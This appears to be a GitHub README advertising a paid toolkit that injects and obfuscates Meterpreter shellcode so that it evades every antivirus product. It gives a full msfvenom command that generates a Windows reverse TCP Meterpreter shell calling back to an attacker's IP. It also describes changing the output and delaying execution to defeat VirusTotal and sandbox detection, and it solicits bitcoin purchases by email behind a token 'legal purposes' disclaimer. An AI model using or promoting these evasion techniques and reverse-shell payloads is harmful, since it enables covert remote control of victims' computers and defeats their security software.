# Meterpreter-FUD
FUD Meterpreter trough shellcode injection and obfuscation, bypass every anti virus.


![221409544-93b34748-e6cd-4e35-9352-9fde25290df3](https://user-images.githubusercontent.com/127155514/223272476-4b2785de-d929-4070-8a9a-1a1ebc2df428.png)


Watch the video!!

The Toolkit has 2 scripts, A shellcode injector and a obfuscator, you have to generate the payload via Metersploit and this command:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f python

You put the shellcode into the shellcode.py file, then you run the main.py script and get a fud python script, which you can compile to a exe file

The output python script will always be different and takes a different delay between 30-60 seconds, because of the special obfuscator, so even if someone upload the script to virustotal, the new generated will not get detected. But pls dont upload ;) Only for LEGAL purposes!!!

Write an email to CNP_EVO@proton.me to buy it, payments via bitcoin!
